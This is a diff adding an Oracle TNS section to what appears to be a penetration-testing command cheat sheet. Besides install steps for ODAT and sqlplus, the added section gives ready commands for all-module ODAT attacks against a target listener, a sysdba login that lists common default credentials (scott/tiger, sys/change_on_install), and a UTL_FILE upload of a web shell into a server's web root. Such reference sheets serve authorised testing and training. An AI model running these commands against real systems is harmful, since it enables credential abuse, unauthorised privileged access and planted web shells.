@@ -48,6 +48,10 @@
   - `2.9` **MSSQL Database Enumeration**
     - `2.9.1` impacket-mssqlclient connection & auth modes
     - `2.9.2` List non-default databases
+  - `2.10` **Oracle TNS Enumeration**
+    - `2.10.1` odat.py all-modules enumeration
+    - `2.10.2` sqlplus connection as sysdba
+    - `2.10.3` odat.py UTL_FILE web shell upload
 - `3` **Initial Attack Vectors**
   - `3.1` **LLMNR/NBT-NS Poisoning**
     - `3.1.1` Responder hash capture
@@ -923,6 +927,126 @@ SELECT name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msd
 
 - Lists all user-created databases by excluding the four default system databases.
 - Run inside the `impacket-mssqlclient` interactive shell.
+
+</details>
+
+### 2.10 Oracle TNS Enumeration
+
+<details>
+<summary>ODAT installation</summary>
+
+```bash
+sudo apt-get update
+sudo apt-get install -y build-essential python3-dev libaio1
+cd ~
+wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
+tar xzf cx_Oracle-8.3.0.tar.gz
+cd cx_Oracle-8.3.0
+python3 setup.py build
+sudo python3 setup.py install
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+pip3 install openpyxl
+```
+
+</details>
+
+<details>
+<summary>sqlplus installation</summary>
+
+```bash
+sudo apt update
+sudo apt upgrade parrot-core
+sudo apt update
+sudo apt install oracle-instantclient-sqlplus
+```
+
+If you get `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file`:
+
+```bash
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
+sudo ldconfig
+```
+
+</details>
+
+#### 2.10.1 odat.py all-modules enumeration
+
+```bash
+./odat.py all -s <TARGET_IP>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- ODAT (Oracle Database Attack Tool) runs all available modules against the target: SID brute force, account brute force, privilege escalation, code execution, file upload/download, and more.
+- Combines discovery, credential testing, and exploitation into a single pass.
+
+**Parameters**
+
+- `all` — Execute every ODAT module.
+- `-s <TARGET_IP>` — Target Oracle TNS listener.
+
+</details>
+
+#### 2.10.2 sqlplus connection as sysdba
+
+```bash
+sqlplus <USER>/<PASS>@<TARGET_IP>/<SID> as sysdba
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Connects to an Oracle database with sysdba privileges.
+- Common default credentials: `scott/tiger`, `system/manager`, `sys/change_on_install`.
+- `<SID>` is the Oracle System Identifier (e.g. `XE` for Oracle Express Edition).
+- `as sysdba` elevates the session to the highest privilege level — required for file system operations via UTL_FILE.
+
+**Parameters**
+
+- `sqlplus` — Oracle's native SQL client.
+- `<USER>/<PASS>` — Credentials.
+- `<TARGET_IP>/<SID>` — Listener address and database SID.
+- `as sysdba` — Authenticate as system database administrator.
+
+</details>
+
+#### 2.10.3 odat.py UTL_FILE web shell upload
+
+```bash
+./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile <REMOTE_PATH> <REMOTE_FILE> <LOCAL_FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Leverages Oracle's UTL_FILE package to write a file to disk on the database server (e.g. a web shell into `C:\inetpub\wwwroot`).
+- Requires sysdba privileges.
+- The file is written to a directory accessible to the Oracle service account.
+
+**Parameters**
+
+- `utlfile` — ODAT module for UTL_FILE read/write operations.
+- `-s <TARGET_IP>` — Target Oracle TNS listener.
+- `-d <SID>` — Database SID (e.g. `XE`).
+- `-U <USER>` / `-P <PASS>` — Credentials.
+- `--sysdba` — Use sysdba privilege.
+- `--putFile <REMOTE_PATH> <REMOTE_FILE> <LOCAL_FILE>` — Write `<LOCAL_FILE>` to `<REMOTE_PATH>` on the target as `<REMOTE_FILE>`.
 
 </details>
 
